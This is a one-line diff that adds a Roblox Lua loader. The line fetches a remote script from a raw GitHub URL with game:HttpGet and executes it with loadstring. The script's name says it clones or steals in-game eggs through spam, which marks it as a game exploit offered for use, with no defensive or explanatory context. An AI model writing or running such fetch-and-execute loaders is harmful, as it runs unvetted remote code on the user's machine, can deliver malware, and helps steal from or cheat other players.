@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/clone-to-steal-eggs-spam1-plobtslnm6fdrc.lua"))()
